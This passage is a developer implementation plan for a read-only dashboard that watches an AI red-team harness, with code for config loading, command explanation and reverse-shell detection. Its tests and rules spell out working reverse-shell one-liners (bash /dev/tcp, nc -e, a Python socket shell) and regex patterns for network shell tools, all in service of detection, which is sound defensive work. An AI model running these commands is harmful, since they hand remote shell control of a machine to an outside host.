# Goose Activity Monitor Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a read-only, real-time web dashboard that observes the existing Goose 1.46.0 + Qwen red-team infrastructure and displays sessions, tool calls, responses, errors, external connections, and reverse-shell alerts.

**Architecture:** A FastAPI backend runs a collector that (a) polls Goose's `sessions.db` (SQLite, read-only) for new `messages` rows and (b) tails the gateway `audit.log` (JSONL). Raw records are normalized into a canonical event schema, scored by a detection engine, persisted to a local `events.db`, and fanned out to browsers over a WebSocket. A static vanilla-JS frontend renders a dark SOC console. Nothing outside `monitor/` is touched; all Goose data is opened read-only.

**Tech Stack:** Python 3, FastAPI, uvicorn[standard], PyYAML, stdlib `sqlite3`, `asyncio`; vanilla HTML/CSS/JS (no build step); pytest for tests.

**Spec:** `monitor/docs/monitor-design.md`

## Global Constraints

- **Read-only w.r.t. Goose:** open `sessions.db` with `mode=ro` (URI `file:...?mode=ro`); never write, move, or lock Goose files; never call/execute anything in Goose. No endpoint mutates or runs commands.
- **No changes outside `monitor/`.** Do not modify Goose, gateway, vLLM, Ollama, or Qwen config.
- **Never emit `thinking` content.** Drop all `thinking` blocks at ingest — never store or transmit them.
- **No external network calls, no telemetry/analytics.** Backend never contacts the internet. Optional LLM explanation is OFF by default and never auto-invoked.
- **No fabricated network connections.** Only emit an `external_connection` from a real network tool (`source: "tool"`) or a host/URL literally present in a command (`source: "referenced"`, classification defaults `UNKNOWN`).
- **Auth required.** Bind `0.0.0.0:8787`; HTTP Basic Auth; refuse to start if the password is empty.
- **Paths (from config, defaults):** sessions.db = `~/.local/share/goose/sessions/sessions.db`; audit.log = `/home/cristi/qwen_harness/gateway/state/audit.log`; events.db = `monitor/events.db`.
- **Full data preserved in storage.** The UI may collapse/virtualize, but `events.db` stores complete command/response/`raw_json`.
- **Timestamps:** store UTC epoch milliseconds; display in browser-local tz as `YYYY-MM-DD HH:MM:SS.mmm`.
- **Not a git repo:** the working tree is not under git. Where steps say "Commit", first ensure a repo exists — run `git init` inside `monitor/` once (Task 0) and commit there; all commits are local to `monitor/`.

---

### Task 0: Project scaffold, dependencies, config loader

**Files:**
- Create: `monitor/requirements.txt`, `monitor/config.yaml`, `monitor/config.example.yaml`, `monitor/.gitignore`
- Create: `monitor/backend/__init__.py`, `monitor/backend/sources/__init__.py`, `monitor/tests/__init__.py`
- Create: `monitor/backend/config.py`
- Test: `monitor/tests/test_config.py`

**Interfaces:**
- Produces: `config.load(path: str | None = None) -> Config`; `Config` is a dataclass with attributes `bind_host: str`, `bind_port: int`, `auth_username: str`, `auth_password: str`, `sessions_db: str` (expanduser-ed abs path), `audit_log: str`, `poll_interval_ms: int`, `active_window_s: int`, `idle_window_s: int`, `retention_max_age_days: int`, `retention_max_events: int`, `redaction_enabled: bool`, `llm_explain_enabled: bool`, `events_db: str`. `config.ConfigError(Exception)`.

- [ ] **Step 1: Write `requirements.txt` and `.gitignore`**

`monitor/requirements.txt`:
```
fastapi==0.115.*
uvicorn[standard]==0.30.*
PyYAML==6.*
pytest==8.*
httpx==0.27.*
```
`monitor/.gitignore`:
```
events.db
events.db-*
__pycache__/
*.pyc
config.yaml
```

- [ ] **Step 2: Write `config.example.yaml` and a dev `config.yaml`**

`monitor/config.example.yaml` (and copy to `config.yaml` with a dev password for local runs):
```yaml
bind_host: 0.0.0.0
bind_port: 8787
basic_auth:
  username: admin
  password: "changeme"        # empty -> server refuses to start
sources:
  sessions_db: ~/.local/share/goose/sessions/sessions.db
  audit_log: /home/cristi/qwen_harness/gateway/state/audit.log
events_db: ./events.db
poll_interval_ms: 500
status:
  active_window_s: 60
  idle_window_s: 1800
retention:
  max_age_days: 30
  max_events: 500000
redaction:
  enabled: true
llm_explain:
  enabled: false
```

- [ ] **Step 3: Write the failing test**

`monitor/tests/test_config.py`:
```python
import os, textwrap, pytest
from backend import config

def _write(tmp_path, body):
    p = tmp_path / "c.yaml"; p.write_text(textwrap.dedent(body)); return str(p)

def test_load_expands_paths_and_types(tmp_path):
    p = _write(tmp_path, """
        bind_host: 127.0.0.1
        bind_port: 9000
        basic_auth: {username: u, password: pw}
        sources: {sessions_db: ~/x.db, audit_log: /tmp/a.log}
        events_db: ./e.db
        poll_interval_ms: 250
        status: {active_window_s: 30, idle_window_s: 600}
        retention: {max_age_days: 7, max_events: 100}
        redaction: {enabled: false}
        llm_explain: {enabled: true}
    """)
    c = config.load(p)
    assert c.bind_port == 9000
    assert c.auth_username == "u" and c.auth_password == "pw"
    assert c.sessions_db == os.path.expanduser("~/x.db")
    assert c.active_window_s == 30 and c.idle_window_s == 600
    assert c.redaction_enabled is False and c.llm_explain_enabled is True

def test_empty_password_refused(tmp_path):
    p = _write(tmp_path, """
        basic_auth: {username: u, password: ""}
        sources: {sessions_db: ~/x.db, audit_log: /tmp/a.log}
    """)
    with pytest.raises(config.ConfigError):
        config.load(p)
```

- [ ] **Step 4: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_config.py -v`
Expected: FAIL (`ModuleNotFoundError: backend.config` / attribute errors).

- [ ] **Step 5: Implement `backend/config.py`**

```python
import os
from dataclasses import dataclass
import yaml

class ConfigError(Exception): ...

@dataclass
class Config:
    bind_host: str = "0.0.0.0"
    bind_port: int = 8787
    auth_username: str = "admin"
    auth_password: str = ""
    sessions_db: str = "~/.local/share/goose/sessions/sessions.db"
    audit_log: str = "/home/cristi/qwen_harness/gateway/state/audit.log"
    events_db: str = "./events.db"
    poll_interval_ms: int = 500
    active_window_s: int = 60
    idle_window_s: int = 1800
    retention_max_age_days: int = 30
    retention_max_events: int = 500000
    redaction_enabled: bool = True
    llm_explain_enabled: bool = False

def _abs(p): return os.path.abspath(os.path.expanduser(p))

def load(path=None):
    path = path or os.environ.get("MONITOR_CONFIG", "config.yaml")
    with open(path) as f:
        d = yaml.safe_load(f) or {}
    auth = d.get("basic_auth", {})
    src = d.get("sources", {})
    st = d.get("status", {})
    ret = d.get("retention", {})
    c = Config(
        bind_host=d.get("bind_host", "0.0.0.0"),
        bind_port=int(d.get("bind_port", 8787)),
        auth_username=auth.get("username", "admin"),
        auth_password=str(auth.get("password", "")),
        sessions_db=_abs(src.get("sessions_db", Config.sessions_db)),
        audit_log=_abs(src.get("audit_log", Config.audit_log)),
        events_db=_abs(d.get("events_db", "./events.db")),
        poll_interval_ms=int(d.get("poll_interval_ms", 500)),
        active_window_s=int(st.get("active_window_s", 60)),
        idle_window_s=int(st.get("idle_window_s", 1800)),
        retention_max_age_days=int(ret.get("max_age_days", 30)),
        retention_max_events=int(ret.get("max_events", 500000)),
        redaction_enabled=bool(d.get("redaction", {}).get("enabled", True)),
        llm_explain_enabled=bool(d.get("llm_explain", {}).get("enabled", False)),
    )
    if os.environ.get("MONITOR_PASSWORD"):
        c.auth_password = os.environ["MONITOR_PASSWORD"]
    if not c.auth_password:
        raise ConfigError("basic_auth.password is empty; refusing to start")
    return c
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_config.py -v`
Expected: PASS (2 passed). Add a `monitor/pytest.ini` with `[pytest]\npythonpath = .` so `backend` imports resolve.

- [ ] **Step 7: Commit**

```bash
cd monitor && git init -q && git add -A && git commit -q -m "feat(monitor): scaffold, deps, config loader"
```

---

### Task 1: Wildcard matcher

**Files:**
- Create: `monitor/backend/wildcard.py`
- Test: `monitor/tests/test_wildcard.py`

**Interfaces:**
- Produces: `wildcard.matches(pattern: str, text: str) -> bool`. Empty/None pattern → `True`. Case-insensitive. If pattern contains `*` or `?`, treat as glob (`*`=any run, `?`=one char) anchored to the whole string; otherwise case-insensitive substring (`in`).

- [ ] **Step 1: Write the failing test**

`monitor/tests/test_wildcard.py`:
```python
from backend.wildcard import matches

def test_substring_default():
    assert matches("nmap", "run nmap -sV") is True
    assert matches("NMAP", "run nmap -sV") is True
    assert matches("xyz", "run nmap") is False

def test_glob_star():
    assert matches("*something*", "aaa something bbb") is True
    assert matches("nmap*", "nmap -sV") is True
    assert matches("nmap*", "run nmap") is False       # anchored start
    assert matches("*:443", "10.0.0.1:443") is True
    assert matches("*:443", "10.0.0.1:80") is False

def test_glob_question():
    assert matches("h?st", "host") is True
    assert matches("h?st", "haaast") is False

def test_empty_pattern_matches_all():
    assert matches("", "anything") is True
    assert matches(None, "anything") is True
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_wildcard.py -v`
Expected: FAIL (`ModuleNotFoundError`).

- [ ] **Step 3: Implement `backend/wildcard.py`**

```python
import fnmatch

def matches(pattern, text):
    if not pattern:
        return True
    text = "" if text is None else str(text)
    if "*" in pattern or "?" in pattern:
        return fnmatch.fnmatch(text.lower(), pattern.lower())
    return pattern.lower() in text.lower()
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_wildcard.py -v`
Expected: PASS (4 passed).

- [ ] **Step 5: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): wildcard matcher"
```

---

### Task 2: Detection — command explanation (deterministic, argv-aware)

**Files:**
- Create: `monitor/backend/detection.py` (grows over Tasks 2–4)
- Test: `monitor/tests/test_explain.py`

**Interfaces:**
- Produces: `detection.explain(tool: str, arguments: dict) -> str`. For known structured tools (`kali_nmap`, `kali_whatweb`, `kali_nikto`, `kali_gobuster`, `net_dig`, `net_nc`, `net_openssl`, `net_whois`, `net_tracepath`, `web_search`, `web_fetch`) build a description from args. For shell tools (`shell`, `sandbox_bash`, `kali_shell`, `developer__shell`) call `_explain_shell(command: str) -> str` which parses the **leading binary of the first pipeline segment** plus notable flags — it must NOT match keywords appearing only inside quoted strings / grep patterns / here-docs.

- [ ] **Step 1: Write the failing test**

`monitor/tests/test_explain.py`:
```python
from backend import detection

def test_nmap_structured():
    s = detection.explain("kali_nmap", {"target":"192.168.50.1","top_ports":100,"service_scan":True})
    assert "192.168.50.1" in s and "100" in s and "version" in s.lower()

def test_web_fetch():
    s = detection.explain("web_fetch", {"url":"https://example.com/a"})
    assert "example.com" in s

def test_shell_curl():
    s = detection.explain("sandbox_bash", {"command":"curl -s https://example.com -o /work/x"})
    assert "curl" in s.lower()

def test_shell_grep_not_firmware_falsepositive():
    # 'firmware' appears only inside the grep PATTERN; explanation must be about grep/curl, not "firmware analysis"
    cmd = "curl -s http://192.168.50.1/Main_Login.asp -o /work/login.html; grep -inE 'version|firmware|model' /work/login.html"
    s = detection.explain("sandbox_bash", {"command": cmd})
    assert "firmware analysis" not in s.lower()
    assert "curl" in s.lower() or "http" in s.lower()

def test_shell_python_heredoc():
    s = detection.explain("sandbox_bash", {"command":"cd /work && python3 - <<'EOF'\nprint(1)\nEOF"})
    assert "python" in s.lower()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_explain.py -v`
Expected: FAIL (`ModuleNotFoundError` / `AttributeError: explain`).

- [ ] **Step 3: Implement `explain` + `_explain_shell` in `backend/detection.py`**

```python
import re, shlex

def _priv(host):  # helper reused later
    return bool(re.match(r"(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|localhost)", str(host)))

def explain(tool, arguments):
    a = arguments or {}
    t = (tool or "").lower()
    if t.endswith("nmap"):
        sv = " with service/version detection" if a.get("service_scan") else ""
        return f"TCP-connect port scan of {a.get('target')} (top {a.get('top_ports','?')} ports){sv}."
    if t.endswith("whatweb"):
        return f"HTTP fingerprint of {a.get('host')}:{a.get('port','')}{' over TLS' if a.get('ssl') else ''}."
    if t.endswith("nikto"):
        return f"Nikto web-server vulnerability scan of {a.get('host')}:{a.get('port','')}."
    if t.endswith("gobuster"):
        return f"Directory/file brute-force against {a.get('url') or a.get('host')}."
    if t.endswith("dig"):
        return f"DNS lookup of {a.get('name') or a.get('query') or list(a.values())}."
    if t.endswith("whois"):
        return f"WHOIS lookup for {a.get('query')}."
    if t.endswith("tracepath"):
        return f"Path/MTU trace to {a.get('host') or list(a.values())}."
    if t.endswith("openssl"):
        return f"TLS certificate/handshake inspection of {a.get('host') or list(a.values())}."
    if t.endswith("nc"):
        return f"TCP connectivity check to {a.get('host') or list(a.values())}."
    if t.endswith("web_search"):
        return f"Web search: {a.get('query')!r}."
    if t.endswith("web_fetch"):
        return f"Fetches URL {a.get('url')}."
    if "command" in a:
        return _explain_shell(a["command"])
    return f"{tool} call."

_FIRST_SEG = re.compile(r"[|;&\n]")

def _explain_shell(command):
    cmd = (command or "").strip()
    # first pipeline segment, up to first separator not inside quotes (heuristic: split on newline/;/&&/| but ignore heredoc body)
    head = cmd.split("<<", 1)[0]           # drop heredoc redirection marker region for binary detection
    seg = _FIRST_SEG.split(head, 1)[0].strip()
    try:
        argv = shlex.split(seg)
    except ValueError:
        argv = seg.split()
    binv = (argv[0] if argv else "").split("/")[-1]
    low = cmd.lower()
    m = {
        "curl": "HTTP request via curl", "wget": "Download via wget",
        "python3": "Runs an inline Python script", "python": "Runs an inline Python script",
        "grep": "Text search (grep) over files/output", "egrep": "Text search (grep)",
        "sed": "Stream edit (sed)", "awk": "Field/text extraction (awk)",
        "cat": "Reads file contents", "head": "Reads start of a file", "tail": "Reads end of a file",
        "strings": "Extracts printable strings from a binary", "xxd": "Hex dump of a file",
        "ls": "Lists files", "find": "Searches the filesystem", "file": "Identifies a file type",
        "unzip": "Extracts a ZIP archive", "tar": "Extracts/creates a tar archive",
        "unsquashfs": "Unpacks a squashfs filesystem image",
        "nmap": "Runs nmap port/service scan", "ping": "ICMP reachability check",
        "nc": "netcat connection", "socat": "socat relay/connection",
        "objdump": "Disassembly/inspection with objdump", "readelf": "ELF header/section inspection",
        "for": "Shell loop over items", "echo": "Prints a literal string",
    }
    base = m.get(binv, f"Runs `{binv}`" if binv else "Shell command")
    # enrich curl/wget with URL
    if binv in ("curl", "wget"):
        url = re.search(r"https?://[^\s\"']+", cmd)
        if url: base += f" to {url.group(0)}"
    return base + "."
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_explain.py -v`
Expected: PASS (5 passed).

- [ ] **Step 5: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): deterministic command explanation"
```

---

### Task 3: Detection — external connections & error classification

**Files:**
- Modify: `monitor/backend/detection.py`
- Test: `monitor/tests/test_external.py`, `monitor/tests/test_errors.py`

**Interfaces:**
- Produces:
  - `detection.external_connections(tool: str, arguments: dict, command: str | None) -> list[dict]` — each dict: `{host, port, proto, classification ("INTERNAL"|"EXTERNAL"|"UNKNOWN"), source ("tool"|"referenced")}`. Network tools → `source:"tool"`. A URL/`host:port` literally present in a shell command → `source:"referenced"`, `classification` per `_classify_host` but never better than `UNKNOWN` unless clearly private/public. Emit nothing if no host token exists.
  - `detection.classify_error(exit_code, is_error, decision, stdout, stderr, tool) -> str | None`.
  - `detection._classify_host(host: str) -> str`.

- [ ] **Step 1: Write the failing tests**

`monitor/tests/test_external.py`:
```python
from backend import detection as d

def test_network_tool_internal():
    c = d.external_connections("kali_nmap", {"target":"192.168.50.1"}, None)
    assert c and c[0]["classification"] == "INTERNAL" and c[0]["source"] == "tool"

def test_network_tool_external():
    c = d.external_connections("net_dig", {"name":"example.com"}, None)
    assert c[0]["classification"] == "EXTERNAL" and c[0]["source"] == "tool"

def test_web_fetch_url_port():
    c = d.external_connections("web_fetch", {"url":"https://example.com/a"}, None)
    assert c[0]["host"] == "example.com" and c[0]["port"] == 443 and c[0]["proto"] == "https"

def test_shell_url_is_referenced_only():
    c = d.external_connections("sandbox_bash", {"command":"curl -s https://evil.example/x"}, "curl -s https://evil.example/x")
    assert c[0]["source"] == "referenced"

def test_no_host_no_connection():
    assert d.external_connections("sandbox_bash", {"command":"ls -la /work"}, "ls -la /work") == []
```

`monitor/tests/test_errors.py`:
```python
from backend import detection as d

def test_nonzero_exit():
    assert d.classify_error(1, False, "AUTO", "", "boom", "sandbox_bash") == "exit code: 1"

def test_is_error_flag():
    assert d.classify_error(0, True, "AUTO", "", "", "web_fetch")

def test_denied_decision():
    assert "block" in d.classify_error(None, False, "DENIED:policy", "", "", "sandbox_bash").lower()

def test_http_4xx_in_output():
    assert "403" in d.classify_error(0, False, "AUTO", "HTTP/1.1 403 Forbidden", "", "sandbox_bash")

def test_stderr_with_zero_exit_is_not_error():
    assert d.classify_error(0, False, "AUTO", "ok", "warning: deprecated", "sandbox_bash") is None

def test_network_failure_token():
    assert d.classify_error(0, False, "AUTO", "", "Connection refused", "net_nc")
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd monitor && python -m pytest tests/test_external.py tests/test_errors.py -v`
Expected: FAIL (`AttributeError`).

- [ ] **Step 3: Implement in `backend/detection.py`**

```python
from urllib.parse import urlparse

_NET_TOOLS = ("nmap","whatweb","nikto","gobuster","dig","whois","tracepath","openssl","web_fetch","web_search")
_PORT_BY_SCHEME = {"https":443,"http":80,"ftp":21,"ssh":22}

def _classify_host(host):
    if not host: return "UNKNOWN"
    h = str(host).lower()
    if _priv(h) or h.endswith(".lab") or h in ("qh-target","localhost"):
        return "INTERNAL"
    if re.match(r"^\d+\.\d+\.\d+\.\d+$", h) or "." in h:
        return "EXTERNAL"
    return "UNKNOWN"

def _conn(host, port=None, proto=None, source="tool"):
    return {"host":host,"port":port,"proto":proto,
            "classification":_classify_host(host),"source":source}

def external_connections(tool, arguments, command):
    a = arguments or {}
    t = (tool or "").lower()
    out = []
    if any(t.endswith(x) for x in _NET_TOOLS):
        if "url" in a:
            u = urlparse(a["url"]); out.append(_conn(u.hostname, u.port or _PORT_BY_SCHEME.get(u.scheme), u.scheme, "tool"))
        else:
            host = a.get("target") or a.get("host") or a.get("name") or a.get("query")
            if host:
                proto = "https" if a.get("ssl") else None
                out.append(_conn(host, a.get("port") or (443 if a.get("ssl") else None), proto, "tool"))
        return [c for c in out if c["host"]]
    # shell: referenced-only
    text = command or a.get("command") or ""
    for m in re.finditer(r"https?://[^\s\"']+", text):
        u = urlparse(m.group(0))
        c = _conn(u.hostname, u.port or _PORT_BY_SCHEME.get(u.scheme), u.scheme, "referenced")
        out.append(c)
    if not out:
        for m in re.finditer(r"\b(\d{1,3}(?:\.\d{1,3}){3})(?::(\d{1,5}))?\b", text):
            out.append(_conn(m.group(1), int(m.group(2)) if m.group(2) else None, None, "referenced"))
    # dedupe by (host,port)
    seen=set(); uniq=[]
    for c in out:
        k=(c["host"],c["port"])
        if c["host"] and k not in seen: seen.add(k); uniq.append(c)
    return uniq

_HTTP_ERR = re.compile(r"HTTP/\d\.\d\s+(4\d\d|5\d\d)\s+([^\r\n]*)")
_NET_FAIL = ("connection refused","timed out","timeout","could not resolve","no route to host","connection reset")

def classify_error(exit_code, is_error, decision, stdout, stderr, tool):
    if decision and str(decision).upper().startswith(("DENIED","BLOCK")):
        return "Tool call blocked"
    if exit_code not in (None, 0):
        return f"exit code: {exit_code}"
    if is_error:
        return "Tool execution failed"
    blob = f"{stdout or ''}\n{stderr or ''}"
    m = _HTTP_ERR.search(blob)
    if m:
        return f"HTTP {m.group(1)} {m.group(2).strip()}".strip()
    if any(t in (tool or '').lower() for t in ("net_","web_","nmap","nc","curl")) or "nc" in (tool or ''):
        low = blob.lower()
        for tok in _NET_FAIL:
            if tok in low:
                return tok.title()
    return None
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_external.py tests/test_errors.py -v`
Expected: PASS (11 passed).

- [ ] **Step 5: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): external-connection + error classification"
```

---

### Task 4: Detection — reverse-shell scoring engine

**Files:**
- Modify: `monitor/backend/detection.py`
- Create: `monitor/backend/rules.py` (declarative rule list)
- Test: `monitor/tests/test_detection.py`

**Interfaces:**
- Produces:
  - `rules.REVERSE_SHELL_RULES: list[dict]` — each `{name, weight, pattern (compiled regex) OR predicate}`.
  - `detection.scan_reverse_shell(command: str, stdout: str, stderr: str, connections: list[dict]) -> list[dict]`. Returns `[]` or a single alert `[{type:"reverse_shell", severity, score, reasons:[...], destination}]`. Severity map: `>=6 CRITICAL, 4-5 HIGH, 2-3 MEDIUM, 1 LOW`; **HIGH+ requires >=2 distinct matched rules** (if score>=4 but <2 rules matched, cap severity at MEDIUM).

- [ ] **Step 1: Write the failing test**

`monitor/tests/test_detection.py`:
```python
from backend import detection as d

def test_bash_dev_tcp_reverse_shell_is_high_or_critical():
    cmd = "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
    a = d.scan_reverse_shell(cmd, "", "", [])
    assert a and a[0]["severity"] in ("HIGH","CRITICAL")
    assert a[0]["destination"] == "10.0.0.5:4444"
    assert len(a[0]["reasons"]) >= 2

def test_nc_exec_shell():
    a = d.scan_reverse_shell("nc -e /bin/sh 10.0.0.9 9001", "", "", [])
    assert a and a[0]["severity"] in ("HIGH","CRITICAL")

def test_python_socket_pty_shell():
    cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'"
    a = d.scan_reverse_shell(cmd, "", "", [])
    assert a and a[0]["severity"] in ("HIGH","CRITICAL")

def test_single_weak_indicator_not_high():
    # only 'bash -i' present (weight 2, one rule) -> MEDIUM at most, not HIGH
    a = d.scan_reverse_shell("bash -i", "", "", [])
    assert (not a) or a[0]["severity"] in ("LOW","MEDIUM")

def test_benign_grep_no_alert():
    a = d.scan_reverse_shell("grep -inE 'version|firmware' /work/login.html", "", "", [])
    assert a == []

def test_benign_nmap_no_alert():
    a = d.scan_reverse_shell("nmap -sT --top-ports 100 192.168.50.1", "", "", [])
    assert a == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_detection.py -v`
Expected: FAIL (`AttributeError: scan_reverse_shell`).

- [ ] **Step 3: Implement `backend/rules.py`**

```python
import re
C = re.compile
REVERSE_SHELL_RULES = [
    {"name":"/dev/tcp redirect", "weight":3, "pattern":C(r"/dev/(tcp|udp)/")},
    {"name":"nc exec flag", "weight":3, "pattern":C(r"\b(nc|ncat)\b[^\n]*\s-(e|c)\b")},
    {"name":"mkfifo+nc", "weight":3, "pattern":C(r"mkfifo[^\n]*\n?[^\n]*\b(nc|ncat)\b")},
    {"name":"socat EXEC", "weight":3, "pattern":C(r"socat[^\n]*(EXEC:|SYSTEM:)", re.I)},
    {"name":"python socket shell", "weight":3,
     "pattern":C(r"socket[^\n]*(pty\.spawn|subprocess|os\.dup2)", re.S)},
    {"name":"php fsockopen exec", "weight":3, "pattern":C(r"fsockopen[^\n]*(exec|system|shell_exec)", re.S|re.I)},
    {"name":"powershell tcpclient", "weight":3, "pattern":C(r"New-Object\s+System\.Net\.Sockets\.TCPClient", re.I)},
    {"name":"perl socket exec", "weight":2, "pattern":C(r"(IO::Socket|Socket)[^\n]*(exec|system)", re.S)},
    {"name":"ruby tcpsocket exec", "weight":2, "pattern":C(r"TCPSocket[^\n]*(exec|system|/bin/sh)", re.S)},
    {"name":"interactive shell", "weight":2, "pattern":C(r"\b(bash|sh)\s+-i\b")},
    {"name":"base64 shell payload", "weight":2,
     "pattern":C(r"base64\s+-d[^\n]*\|\s*(bash|sh|python)")},
]
```

- [ ] **Step 4: Implement `scan_reverse_shell` in `backend/detection.py`**

```python
from backend import rules as _rules

_DEST = re.compile(r"/dev/(?:tcp|udp)/(\d{1,3}(?:\.\d{1,3}){3})/(\d{1,5})")
_DEST2 = re.compile(r"connect\(\(?[\"'](\d{1,3}(?:\.\d{1,3}){3})[\"']\s*,\s*(\d{1,5})")
_DEST3 = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\s+(\d{1,5})\b")

def _destination(text, connections):
    for rx in (_DEST, _DEST2, _DEST3):
        m = rx.search(text)
        if m: return f"{m.group(1)}:{m.group(2)}"
    for c in connections or []:
        if c.get("host") and c.get("port"): return f"{c['host']}:{c['port']}"
    return None

def scan_reverse_shell(command, stdout, stderr, connections):
    text = "\n".join(x for x in (command, stdout, stderr) if x)
    reasons, score = [], 0
    for r in _rules.REVERSE_SHELL_RULES:
        if r["pattern"].search(text):
            reasons.append(r["name"]); score += r["weight"]
    if score == 0:
        return []
    if score >= 6: sev = "CRITICAL"
    elif score >= 4: sev = "HIGH"
    elif score >= 2: sev = "MEDIUM"
    else: sev = "LOW"
    if sev in ("HIGH","CRITICAL") and len(reasons) < 2:
        sev = "MEDIUM"   # require corroboration for high severity
    return [{"type":"reverse_shell","severity":sev,"score":score,
             "reasons":reasons,"destination":_destination(text, connections)}]
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd monitor && python -m pytest tests/test_detection.py -v`
Expected: PASS (6 passed).

- [ ] **Step 6: Commit**

```bash
cd monitor && git add -A && git commit -q -m "feat(monitor): reverse-shell scoring engine + rules"
```

---

### Task 5: Normalizer — Goose messages → canonical events

**Files:**
- Create: `monitor/backend/normalizer.py`
- Test: `monitor/tests/test_normalizer.py`

**Interfaces:**
- Consumes: `detection.explain`, `detection.external_connections`, `detection.classify_error`, `detection.scan_reverse_shell`.
- Produces:
  - `normalizer.slug(name: str, fallback: str = "") -> str`.
  - `normalizer.iter_content(content_json: str) -> list[dict]` — parsed list, **`thinking` items removed**.
  - `normalizer.MessageState` accumulator with `feed(row: dict) -> list[Event]`, where `row` = a `messages` DB row dict (`session_id, id, role, created_timestamp, content_json`). It pairs a `toolRequest` with the later `toolResponse` of the same `call_id`; emits a `tool_call` event when the response arrives (or a request-only event flushed on demand). `text` items emit `user_message`/`assistant_message` events. Returns events ready to store.
  - `Event` = plain dict matching spec §4 fields (minus `seq`, assigned by store).

- [ ] **Step 1: Write the failing test**

`monitor/tests/test_normalizer.py`:
```python
import json
from backend import normalizer as n

def _row(sid, mid, role, content, ts=1786950042641):
    return {"session_id":sid,"id":mid,"role":role,"created_timestamp":ts,
            "content_json":json.dumps(content)}

def test_thinking_dropped():
    items = n.iter_content(json.dumps([{"type":"thinking","text":"secret"},
                                       {"type":"text","text":"hi"}]))
    assert all(it["type"] != "thinking" for it in items)

def test_slug():
    assert n.slug("ASUS Router Pentest") == "asus_router_pentest"
    assert n.slug("", "hello world foo") == "hello_world_foo"

def test_tool_request_response_pairing():
    st = n.MessageState()
    req = [{"type":"toolRequest","id":"call_1",
            "toolCall":{"value":{"name":"sandbox_bash","arguments":{"command":"echo hi"}}},
            "_meta":{"goose_extension":"gateway"}}]
    resp = [{"type":"toolResponse","id":"call_1",
             "toolResult":{"value":{"structuredContent":{"stdout":"hi","stderr":"","exit_code":0},
                                    "isError":False,"content":[{"type":"text","text":"hi"}]}}}]
    ev = st.feed(_row("s1", 10, "assistant", req))
    assert ev == []                       # waits for response
    ev = st.feed(_row("s1", 11, "user", resp))
    assert len(ev) == 1
    e = ev[0]
    assert e["event_type"] == "tool_call" and e["tool"] == "sandbox_bash"
    assert e["command"] == "echo hi" and e["exit_code"] == 0
    assert e["command_explained"]
    assert e["event_id"] == "s1:10:call_1"

def test_text_messages_emit_events():
    st = n.MessageState()
    ev = st.feed(_row("s1", 1, "user", [{"type":"text","text":"pentest 192.168.50.1"}]))
    assert ev[0]["event_type"] == "user_message"
    ev = st.feed(_row("s1", 2, "assistant", [{"type":"text","text":"Starting scan"}]))
    assert ev[0]["event_type"] == "assistant_message"

def test_error_event_from_nonzero_exit():
    st = n.MessageState()
    st.feed(_row("s1", 3, "assistant",
        [{"type":"toolRequest","id":"c2","toolCall":{"value":{"name":"sandbox_bash","arguments":{"command":"false"}}}}]))
    ev = st.feed(_row("s1", 4, "user",
        [{"type":"toolResponse","id":"c2","toolResult":{"value":{"structuredContent":{"stdout":"","stderr":"","exit_code":1},"isError":False}}}]))
    assert ev[0]["error"] == "exit code: 1"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd monitor && python -m pytest tests/test_normalizer.py -v`
Expected: FAIL (`ModuleNotFoundError`).

- [ ] **Step 3: Implement `backend/normalizer.py`**

```python
import json, re
from backend import detection

def slug(name, fallback=""):
    base = (name or "").strip() or (fallback or "").strip()
    s = re.sub(r"[^a-z0-9]+", "_", base.lower()).strip("_")
    return (s[:40] or "session")

def iter_content(content_json):
    try:
        cj = json.loads(content_json)
    except Exception:
        return []
    items = cj if isinstance(cj, list) else [cj]
    return [it for it in items if isinstance(it, dict) and it.get("type") != "thinking"]

def _mk_event(row, etype, **kw):
    e = {"session_id":row["session_id"], "timestamp_ms":int(row["created_timestamp"]),
         "event_type":etype, "tool":None, "extension":None, "command":None,
         "arguments":None, "command_explained":None, "stdout":None, "stderr":None,
         "exit_code":None, "http_status":None, "error":None, "tier":None,
         "approval_decision":None, "external_connections":[], "security_alerts":[],
         "raw_json":None}
    e.update(kw); return e

class MessageState:
    def __init__(self):
        self.pending = {}   # call_id -> (row, request_item)

    def feed(self, row):
        events = []
        for it in iter_content(row["content_json"]):
            typ = it.get("type")
            if typ == "toolRequest":
                self.pending[it.get("id")] = (row, it)
            elif typ == "toolResponse":
                events += self._pair(row, it)
            elif typ == "text":
                etype = "assistant_message" if row["role"] == "assistant" else "user_message"
                events.append(_mk_event(row, etype, command=it.get("text"),
                                        raw_json=it))
        return events

    def _pair(self, resp_row, resp_it):
        cid = resp_it.get("id")
        req = self.pending.pop(cid, None)
        if not req:
            return []
        req_row, req_it = req
        val = (req_it.get("toolCall") or {}).get("value") or {}
        tool = val.get("name"); args = val.get("arguments") or {}
        ext = (req_it.get("_meta") or {}).get("goose_extension")
        rv = (resp_it.get("toolResult") or {}).get("value") or {}
        sc = rv.get("structuredContent") or {}
        stdout, stderr = sc.get("stdout"), sc.get("stderr")
        exit_code = sc.get("exit_code")
